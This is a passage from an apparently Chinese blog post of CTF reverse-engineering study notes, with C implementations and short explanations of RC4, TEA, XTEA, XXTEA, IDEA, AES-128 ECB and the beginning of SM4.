s[j]) % 256;        Data[k] ^= s[t];    &#125;&#125;int main()&#123;    unsigned char s[256] = &#123; 0 &#125;, s2[256] = &#123; 0 &#125;;//S-box    char key[256] = &#123; &quot;justfortest&quot; &#125;;    char pData[512] = &quot;这是一个用来加密的数据Data&quot;;    unsigned long len = strlen(pData);    int i;    printf(&quot;pData=%s\n&quot;, pData);    printf(&quot;key=%s,length=%d\n\n&quot;, key, strlen(key));    rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化    printf(&quot;完成对S[i]的初始化，如下：\n\n&quot;);    for (i = 0; i&lt;256; i++)    &#123;        printf(&quot;%02X&quot;, s[i]);        if (i &amp;&amp; (i + 1) % 16 == 0)putchar(&#39;\n&#39;);    &#125;    printf(&quot;\n\n&quot;);    for (i = 0; i&lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！    &#123;        s2[i] = s[i];    &#125;    printf(&quot;已经初始化，现在加密:\n\n&quot;);    rc4_crypt(s, (unsigned char*)pData, len);//加密    printf(&quot;pData=%s\n\n&quot;, pData);    printf(&quot;已经加密，现在解密:\n\n&quot;);    //rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥    rc4_crypt(s2, (unsigned char*)pData, len);//解密    printf(&quot;pData=%s\n\n&quot;, pData);    return 0;&#125;//程序完</code></pre><h2 id="tea，xtea，xxtea"><a href="#tea，xtea，xxtea" class="headerlink" title="tea，xtea，xxtea"></a>tea，xtea，xxtea</h2><p>相关题可以去看nepctf和hgame的week1</p><h3 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h3><p>一次加密可以加密两个数据，需要4个key，然后常见标志是date=0x9e3779b9。</p><pre><code>#include&lt;stdio.h&gt;void encrypt(unsigned int *flag , unsigned int *key)&#123;    unsigned int v0,v1,sum=0,i;    unsigned int delta=0x9e3779b9;    v0=flag[0];    v1=flag[1];    for(i=0;i&lt;32;i++)    &#123;        sum+=delta;        v0+=( (v1&lt;&lt;4)+key[0] ) ^ ( v1+sum ) ^((v1&gt;&gt;5)+key[1]);        v1+=( (v0&lt;&lt;4)+key[2] ) ^ ( v0+sum ) ^((v0&gt;&gt;5)+key[3]);    &#125;    flag[0]=v0;    flag[1]=v1;&#125;void decrypt(unsigned int *code , unsigned int *key)&#123;    unsigned int delta=0x9e3779b9;    unsigned int v0,v1,sum=0xC6EF3720,i;// sum=0xC6EF3720    v0=code[0];    v1=code[1];    for(i=0;i&lt;32;i++)    &#123;        v1-=( (v0&lt;&lt;4)+key[2] ) ^ (v0+sum) ^ ( (v0&gt;&gt;5)+key[3] );        v0-=( (v1&lt;&lt;4)+key[0] ) ^ (v1+sum) ^ ( (v1&gt;&gt;5)+key[1] );        sum-=delta;    &#125;    code[0]=v0;    code[1]=v1;&#125;int main()&#123;    unsigned int flag[2]=&#123;1,2&#125;,key[4]=&#123;1,2,3,4&#125;;    unsigned int code[2]=&#123;0xf99e87a6,0xa5b88bf3&#125;;    encrypt(flag,key);    printf(&quot;%x %x\n&quot;,flag[0],flag[1]);    decrypt(code,key);    printf(&quot;%x %x&quot;,code[0],code[1]);&#125;</code></pre><h3 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h3><p>算法特征，在tea算法的基础上多了一些异或运算和&amp;运算，sum的值的变化也变成了在中间位置，然后取哪一个key也是由sum的值来决定的,循环加密的次数也可以由自己来确定了。</p><pre><code>void encrypt(unsigned int r ,unsigned int *flag ,unsigned int *key)&#123;    unsigned int v0,v1,sum=0,i;    unsigned int delta=0x9e3779b9;    v0=flag[0];    v1=flag[1];    for(i=0;i&lt;r;i++)     &#123;        v0+=( ((v1&lt;&lt;4) ^ (v1&gt;&gt;5)) +v1 ) ^ ( sum + key[sum&amp;3] );        sum+=delta;        v1+=( ((v0&lt;&lt;4) ^(v0&gt;&gt;5)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;11)&amp;3 ]);    &#125;    flag[0]=v0;    flag[1]=v1;&#125;void decrypt(unsigned int r ,unsigned int *code ,unsigned int *key)&#123;    unsigned int v0,v1,i,delta=0x9e3779b9;    unsigned int sum=delta*r;    v0=code[0];    v1=code[1];    for(i=0;i&lt;r;i++)    &#123;        v1-=( ((v0&lt;&lt;4) ^(v0&gt;&gt;5)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;11)&amp;3 ]);        sum-=delta;        v0-=( ((v1&lt;&lt;4) ^ (v1&gt;&gt;5)) +v1 ) ^ ( sum + key[sum&amp;3] );    &#125;    code[0]=v0;    code[1]=v1;&#125;#include&lt;stdio.h&gt;int main()&#123;    unsigned int flag[2]=&#123;1,2&#125; ,key[4]=&#123;1,2,3,4&#125;;    unsigned int r=32;    unsigned int code[2]=&#123;0xf4420bdd,0xd58bca18&#125;;    encrypt(r,flag,key);    printf(&quot;%x %x\n&quot;,flag[0],flag[1]);    decrypt(r,code,key);    printf(&quot;%x %x&quot;,code[0],code[1]); &#125; </code></pre><h3 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h3><p>可以自己定义加密数据的个数，然后添加了更多的异或和位移操作，也添加了循环加密的轮次，每一轮加密的过程中的每一个加密数据都与它的上一个和下一个数据有关，特别的是第一个数据，和最后一个数据。</p><p>第一个数据的加密与第二个和最后一个数据有关系，最后一个数据的加密和第一个和倒数第二个数据有关。</p><pre><code>#include&lt;stdio.h&gt;void encrypt(unsigned int *flag ,unsigned int *key ,unsigned int n)&#123;    unsigned int next,end,sum;    unsigned int rounds,e,delta=0x9e3779b9;    int i;    rounds=6+52/n;//轮回的次数    sum=0;    end=flag[n-1];//先设置end的值为最后一个，因为加密第一个要用    do    &#123;        sum+=delta;        e=(sum&gt;&gt;2)&amp;3;//与key的值关;        for(i=0;i&lt;n-1;i++)//加密第一个到倒数第二个        &#123;            next=flag[i+1];            flag[i]+=(( (end&gt;&gt;5^next&lt;&lt;2)  + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) + (key[(i&amp;3)^e]^end) ));            end=flag[i];//现在用end来保存当前数据的值，为下一个数据的加密做准备。        &#125;        next=flag[0];//将第一个数据给next，为加密最后一个数据做准备，这时候end的值为倒数第二个数据。        flag[n-1]+=(( (end&gt;&gt;5^next&lt;&lt;2)  + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) + (key[(i&amp;3)^e]^end) ));        end=flag[n-1];//继续设置end的值为最后一个数据，为新一轮加密做准备。    &#125;while(--rounds);&#125;void decrypt(unsigned int *code ,unsigned int *key ,unsigned int n)&#123;    unsigned int next,end,sum;    unsigned int rounds,e,delta=0x9e3779b9;    int i;    rounds=6+52/n;    sum=rounds*delta;        next=code[0];//设置next为code的第一个     do    &#123;        e=(sum&gt;&gt;2)&amp;3;        for(i=n-1;i&gt;0;i--)//解密最后一个到第二个        &#123;            end=code[i-1];            code[i]-=(( (end&gt;&gt;5^next&lt;&lt;2)  + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) + (key[(i&amp;3)^e]^end) ));            next=code[i];        &#125;        end=code[n-1];        code[0]-=(( (end&gt;&gt;5^next&lt;&lt;2) + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) +(key[i&amp;3^e]^end) ));        next=code[0];        sum-=delta;    &#125;while(--rounds);&#125;int main()&#123;    unsigned int flag[2]=&#123;1,2&#125;,key[4]=&#123;1,2,3,4&#125;;    unsigned int n=2;    unsigned int code[2]=&#123;0x86a5acc6,0x579acf59&#125;;    encrypt(flag,key,n);    printf(&quot;%x %x\n&quot;,flag[0],flag[1]);    decrypt(code,key,n);    printf(&quot;%x %x\n&quot;,code[0],code[1]);&#125;</code></pre><h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><p>密钥128位，转为8个16位的数，然后循环左位移25位得到新的8个数， 扩展到44个数。<br>加密就是，明文和密钥的9轮运算，前8轮一样，最后一轮单独算</p><p>加密算法</p><pre><code>#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define IDEA_ADD_MODULAR    65536#define IDEA_MP_MODULAR     65537unsigned short endkey[52];void swap(unsigned short *a,unsigned short *b)&#123;    unsigned short c;    c=*a;    *a=*b;    *b=c;&#125;unsigned short add_mod(unsigned short a,unsigned short b)&#123;    unsigned short tmp=a+b;    return tmp%IDEA_ADD_MODULAR;&#125;unsigned short mp_mod(unsigned short a,unsigned short b)&#123;    unsigned long long tmp, tmp_a, tmp_b;    tmp_a = a == 0 ? (1 &lt;&lt; 16) : a;    tmp_b = b == 0 ? (1 &lt;&lt; 16) : b;    tmp = (tmp_a * tmp_b) % IDEA_MP_MODULAR;    return (unsigned short)(tmp);&#125;void releft(unsigned short temkey[])&#123;    unsigned high=temkey[0]&gt;&gt;(16-5);    int i;    for(i=0;i&lt;7;i++)    &#123;        temkey[i]=(temkey[i]&lt;&lt;5)|(temkey[i+1]&gt;&gt;(16-5));    &#125;    temkey[7]=temkey[7]&lt;&lt;5|high;&#125;void extendkey(unsigned char key[])&#123;    int i,j,k;    unsigned short temkey[8];    //得到开始的8个endkey     for(i=0;i&lt;8;i++)    &#123;        temkey[i]=(key[i*2]&lt;&lt;8)|(key[i*2+1]);        endkey[i]=(key[i*2]&lt;&lt;8)|(key[i*2+1]);    //    printf(&quot;%04x &quot;,endkey[i]);    &#125;    //用暂时保存的temkey来扩展    for(i=1;i&lt;=5;i++)    &#123;        for(j=0;j&lt;5;j++)        &#123;            releft(temkey);        &#125;        for(k=0;k&lt;8;k++)        &#123;            endkey[i*8+k]=temkey[k];        &#125;    &#125;     //最后4个密钥     for(j=0;j&lt;5;j++)    &#123;        releft(temkey);    &#125;    for(i=0;i&lt;4;i++)    &#123;        endkey[48+i]=temkey[i];    &#125;&#125;void idea_round(unsigned short X[],int group)&#123;    unsigned short out[4],tmp[4],mid[4],mid_out[2];    int i;    tmp[0]=mp_mod(X[0],endkey[6*group+0]);//1    tmp[1]=add_mod(X[1],endkey[6*group+1]);//2    tmp[2]=add_mod(X[2],endkey[6*group+2]);//3    tmp[3]=mp_mod(X[3],endkey[6*group+3]);//4    mid[0]=tmp[0]^tmp[2];//5    mid[1]=tmp[1]^tmp[3];//6    mid[2]=mp_mod(mid[0],endkey[6*group+4]);//7    mid[3]=add_mod(mid[1],mid[2]);//8    mid_out[0]=mp_mod(mid[3],endkey[6*group+5]);//9    mid_out[1]=add_mod(mid[2],mid_out[0]);//10    out[0]=tmp[0]^mid_out[0];    out[1]=tmp[1]^mid_out[1];    out[2]=tmp[2]^mid_out[0];    out[3]=tmp[3]^mid_out[1];    swap(&amp;out[1],&amp;out[2]);    for(i=0;i&lt;4;i++)    &#123;        X[i]=out[i];        printf(&quot;%04x &quot;,X[i]);    &#125;&#125;void encrypt(unsigned char key[],unsigned char date[],unsigned short out[])&#123;    int i,j,rounds,count;    unsigned char *key1;    unsigned char *date1;    unsigned short X[4];    key1=key;    date1=date;    extendkey(key1);    for(i=0;i&lt;52;i++)    &#123;    //    printf(&quot;%04x &quot;,endkey[i]);    &#125;    rounds=strlen((const char*)date)/8;    for(count=0;count&lt;rounds;count++)    &#123;        for(i=0;i&lt;4;i++)        &#123;            X[i]=(date1[i*2]&lt;&lt;8)|(date1[i*2+1]);        &#125;         for(i=0;i&lt;8;i++)        &#123;            idea_round(X,i);            printf(&quot;\n&quot;);        &#125;        //最后一轮        swap(&amp;X[1],&amp;X[2]);        X[0]=mp_mod(X[0],endkey[48]);        X[1]=add_mod(X[1],endkey[49]);        X[2]=add_mod(X[2],endkey[50]);        X[3]=mp_mod(X[3],endkey[51]);        for(i=0;i&lt;4;i++)        &#123;            out[i+count*4]=X[i];        &#125;    &#125;&#125;int main()&#123;    unsigned char key[]=&quot;1234567812345678&quot;;    unsigned char date[]=&quot;1234567812345678&quot;;    unsigned short out[8];    unsigned char buffer[256];    int i;    encrypt(key,date,out);    printf(&quot;\n&quot;);//    for(i=0;i&lt;8;i++)//    &#123;//        printf(&quot;%02x %02x &quot;,*((char*)&amp;out[i])&amp;0xff,*((char*)&amp;out[i] + 1)&amp;0xff);//    &#125;//    printf(&quot;\n&quot;);    for(i=0;i&lt;8;i++)    &#123;        printf(&quot;%04x &quot;,out[i]);    &#125;&#125;</code></pre><p>解密算法好像就是密钥的问题，还没看懂。</p><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>基本介绍：<a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a><br>注意的两个点：</p><ol><li>然后CBC模式就多一个iv，也就是在每一轮加密前，先和iv异或，然后一轮加密后的密文，又作为下一轮的iv</li><li>128,192,256加密的轮数和一些细节地方是不一样的。</li></ol><p>自己的实现，借用了别人的一些代码，是最简单的Aes的ECB模式</p><pre><code>#include&lt;stdio.h&gt;/****************/static unsigned char x2time(unsigned char x)&#123;    if (x&amp;0x80)    &#123;        return (((x&lt;&lt;1)^0x1B)&amp;0xFF);    &#125;    return x&lt;&lt;1;&#125;/*有限域*3乘法 The x2time() function */static unsigned char x3time(unsigned char x)&#123;    return (x2time(x)^x);&#125;/*有限域*4乘法 The x4time() function */static unsigned char x4time(unsigned char x)&#123;    return ( x2time(x2time(x)) );&#125;/*有限域*8乘法 The x8time() function */static unsigned char x8time(unsigned char x)&#123;    return ( x2time(x2time(x2time(x))) );&#125;/*有限域9乘法 The x9time() function */static unsigned char x9time(unsigned char x)    //9:1001&#123;    return ( x8time(x)^x );&#125;/*有限域*B乘法 The xBtime() function */static unsigned char xBtime(unsigned char x)    //B:1011&#123;    return ( x8time(x)^x2time(x)^x );&#125;/*有限域*D乘法 The xDtime() function */static unsigned char xDtime(unsigned char x)    //D:1101&#123;    return ( x8time(x)^x4time(x)^x );&#125;/*有限域*E乘法 The xEtime() function */static unsigned char xEtime(unsigned char x)    //E:1110&#123;    return ( x8time(x)^x4time(x)^x2time(x) );&#125;/***********************/unsigned char S[16][16] = &#123; 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 &#125;;unsigned char S2[16][16] = &#123; 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d &#125;;unsigned int Rcon[10]=&#123;0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36&#125;;void addRoundKey(unsigned char *ipArray,unsigned char *endkey,int n)&#123;    int i;    for(i=0;i&lt;4;i++)    &#123;        ipArray[i*4+0]^=endkey[i*4+n*16+0];        ipArray[i*4+1]^=endkey[i*4+n*16+1];        ipArray[i*4+2]^=endkey[i*4+n*16+2];        ipArray[i*4+3]^=endkey[i*4+n*16+3];    &#125;&#125;void subBytes(unsigned char *ipArray)&#123;    int i;    int a,b;    for(i=0;i&lt;16;i++)    &#123;        a=ipArray[i]&gt;&gt;4;        b=ipArray[i]&amp;0xf;        ipArray[i]=S[a][b];    &#125;&#125;void shiftRows(unsigned char *ipArray)&#123;    int i,j,k;    unsigned char tmp,mid[16];    for(i=0;i&lt;4;i++)    &#123;        for(j=0;j&lt;4;j++)        &#123;            mid[j*4+i]=ipArray[i*4+j];        &#125;    &#125;    for(i=1;i&lt;4;i++)    &#123;        for(j=0;j&lt;i;j++)        &#123;            tmp=mid[i*4];            for(k=0;k&lt;3;k++)            &#123;                mid[i*4+k]=mid[i*4+k+1];            &#125;            mid[i*4+k]=tmp;        &#125;    &#125;    for(i=0;i&lt;4;i++)    &#123;        for(j=0;j&lt;4;j++)        &#123;            ipArray[j*4+i]=mid[i*4+j];        &#125;    &#125;&#125;void mixColumns(unsigned char *ipArray)&#123;    unsigned char a[] = &#123;0x02, 0x03, 0x01, 0x01&#125;;    unsigned char tmp[4],mid[16];    int i,j;    for(i=0,j=0;i&lt;4;i++,j+=4)    &#123;        tmp[0]=x2time(ipArray[j]) ^ x3time(ipArray[j+1]) ^ ipArray[j+2] ^ ipArray[j+3];//2 3 1 1        tmp[1]=ipArray[j] ^ x2time(ipArray[j+1]) ^ x3time(ipArray[j+2]) ^ ipArray[j+3];//1 2 3 1        tmp[2]=ipArray[j] ^ ipArray[j+1] ^ x2time(ipArray[j+2]) ^ x3time(ipArray[j+3]);//1 1 2 3        tmp[3]=x3time(ipArray[j]) ^ ipArray[j+1] ^ ipArray[j+2] ^ x2time(ipArray[j+3]);//3 1 1 2        mid[i*4+0]=tmp[0];        mid[i*4+1]=tmp[1];        mid[i*4+2]=tmp[2];        mid[i*4+3]=tmp[3];    &#125;    for(i=0;i&lt;16;i++)    &#123;        ipArray[i]=mid[i];    &#125;&#125;//加密 void AesEncrypt(unsigned char *in,unsigned char *endkey,unsigned char *out)&#123;    unsigned char *ipArray;    int i,j,k;    int rounds=10;    ipArray=in;    addRoundKey(ipArray, endkey,0);    for(i=1;i&lt;10;i++)    &#123;        subBytes(ipArray);        shiftRows(ipArray);        mixColumns(ipArray);        addRoundKey(ipArray,endkey,i);    &#125;    subBytes(ipArray);    shiftRows(ipArray);    addRoundKey(ipArray,endkey,10);&#125;void inv_shiftRows(unsigned char *state)&#123;    int i,j,k;    unsigned char tmp,mid[16];    for(i=0;i&lt;4;i++)    &#123;        for(j=0;j&lt;4;j++)        &#123;            mid[j*4+i]=state[i*4+j];        &#125;    &#125;    for(i=1;i&lt;4;i++)    &#123;        for(j=0;j&lt;i;j++)        &#123;            tmp=mid[i*4+3];            for(k=3;k&gt;0;k--)            &#123;                mid[i*4+k]=mid[i*4+k-1];            &#125;            mid[i*4+k]=tmp;        &#125;    &#125;    for(i=0;i&lt;4;i++)    &#123;        for(j=0;j&lt;4;j++)        &#123;            state[j*4+i]=mid[i*4+j];        &#125;    &#125;&#125;void inv_subBytes(unsigned char *state)&#123;    int i;    int a,b;    for(i=0;i&lt;16;i++)    &#123;        a=state[i]&gt;&gt;4;        b=state[i]&amp;0xf;        state[i]=S2[a][b];    &#125;&#125;void inv_mixColumns(unsigned char *state)&#123;    unsigned char a[] = &#123;0x0E, 0x0B, 0x0D, 0x09&#125;;    unsigned char tmp[4],mid[16];    int i,j;    for(i=0,j=0;i&lt;4;i++,j+=4)    &#123;        tmp[0]=xEtime(state[j]) ^ xBtime(state[j+1]) ^ xDtime(state[j+2]) ^ x9time(state[j+3]);//E B D 9        tmp[1]=x9time(state[j]) ^ xEtime(state[j+1]) ^ xBtime(state[j+2]) ^ xDtime(state[j+3]);//9 E B D        tmp[2]=xDtime(state[j]) ^ x9time(state[j+1]) ^ xEtime(state[j+2]) ^ xBtime(state[j+3]);//D 9 E B        tmp[3]=xBtime(state[j]) ^ xDtime(state[j+1]) ^ x9time(state[j+2]) ^ xEtime(state[j+3]);//B D 9 E        mid[i*4+0]=tmp[0];        mid[i*4+1]=tmp[1];        mid[i*4+2]=tmp[2];        mid[i*4+3]=tmp[3];    &#125;    for(i=0;i&lt;16;i++)    &#123;        state[i]=mid[i];    &#125;&#125;//解密 void AesDecrypt(unsigned char *in,unsigned char *endkey,unsigned char *out)&#123;    unsigned char *state;    int i,j,k;    int rounds=10;    state=in;    addRoundKey(state,endkey,10);    for(i=rounds-1;i&gt;0;i--)    &#123;        inv_shiftRows(state);        inv_subBytes(state);        addRoundKey(state,endkey,i);        inv_mixColumns(state);    &#125;    inv_shiftRows(state);    inv_subBytes(state);    addRoundKey(state,endkey,0);&#125;//扩展密钥 void leftLoop(unsigned char mid[])&#123;    unsigned char t;    t=mid[0]; mid[0]=mid[1]; mid[1]=mid[2]; mid[2]=mid[3]; mid[3]=t;&#125;void box_change(unsigned char mid[])&#123;    int i;    int a,b;    for(i=0;i&lt;4;i++)    &#123;        a=mid[i]&gt;&gt;4;        b=mid[i]&amp;0xf;        mid[i]=S[a][b];    &#125;&#125;void extendkey(unsigned char key[],unsigned char endkey[])&#123;    unsigned char tmp[4];    int i;    for(i=0;i&lt;4;i++)    &#123;        endkey[i*4+0]=key[i*4+0];        endkey[i*4+1]=key[i*4+1];        endkey[i*4+2]=key[i*4+2];        endkey[i*4+3]=key[i*4+3];    &#125;    for(i=4;i&lt;44;i++)    &#123;        tmp[0]=endkey[4*(i-1)+0];         tmp[1]=endkey[4*(i-1)+1];        tmp[2]=endkey[4*(i-1)+2];        tmp[3]=endkey[4*(i-1)+3];        if(i%4==0)        &#123;            leftLoop(tmp);            box_change(tmp);            tmp[0]^=Rcon[i/4-1];        &#125;        endkey[i*4+0]=tmp[0]^endkey[4*(i-4)+0];        endkey[i*4+1]=tmp[1]^endkey[4*(i-4)+1];        endkey[i*4+2]=tmp[2]^endkey[4*(i-4)+2];        endkey[i*4+3]=tmp[3]^endkey[4*(i-4)+3];    &#125;&#125;int main(void)&#123;    unsigned char plain[17]=&quot;abcdefghijklmnop&quot;,key[17]=&quot;1234567812345678&quot;;    unsigned char endkey[11*16+1];    unsigned char out[16];    unsigned char code[16]=&#123;0xCC,0x96,0xB9,0x6C,0x11,0xBD,0xAD,0x3A,0x7A,0x73,0xDB,0xCD,0x9E,0x5A,0xF2,0x44&#125;;    int i;    extendkey(key,endkey);//    for(i=0;i&lt;11*16;i++)//    &#123;//        if(i%4==0)//        &#123;//            printf(&quot; &quot;);//        &#125;        //        printf(&quot;%02x&quot;,endkey[i]);//    &#125;    AesEncrypt(plain,endkey,out);    printf(&quot;加密后的数据是：&quot;) ;    for (i = 0; i &lt; 16; i++)    &#123;        printf(&quot;0x%02x,&quot;, plain[i]);    &#125;    printf(&quot;\n解密后的数据是：&quot;) ;    AesDecrypt(code,endkey,out);        for (i = 0; i &lt; 16; i++)    &#123;        printf(&quot;%c&quot;, code[i]);    &#125;    &#125;</code></pre><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p><a href="https://bbs.pediy.com/thread-253558.htm#msg_header_h1_1">https://bbs.pediy.com/thread-253558.htm#msg_header_h1_1</a><br>占时不打算直接用c写了，整个过程大致了解了，可以说是bit位的加密方式，如果以后有必要在来补充吧。</p><h2 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h2><p><a href="https://blog.csdn.net/weixin_46491183/article/details/112686034">https://blog.csdn.net/weixin_46491183/article/details/112686034</a><br><a href="https://blog.csdn.net/weixin_42700740/article/details/102667012">https://blog.csdn.net/weixin_42700740/article/details/102667012</a><br><a href="https://blog.csdn.net/jiujiederoushan/article/details/100122773">https://blog.csdn.net/jiujiederoushan/article/details/100122773</a></p><p>自己用c写的ECB模式。</p><pre><code>#include&lt;stdio.h&gt;unsigned int FK[4] = &#123;    0xa3b1bac6,    0x56aa3350,    0x677d9197,    0xb27022dc&#125;;/******************************定义固定参数CK的取值****************************************/unsigned int CK[32] = &#123;    0x00070e15,0x1c232a31,0x383f464d,0x545b6269,    0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,    0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,    0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,    0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,    0x30373e45,0x4c535a61,0x686f767d,0x848b9299,    0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,    0x10171e25,0x2c333a41,0x484f565d,0x646b7279&#125;;/******************************SBox参数列表****************************************/unsigned char SBOX[256] = &#123;    0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,    0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,    0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,    0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,    0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,    0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,    0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,    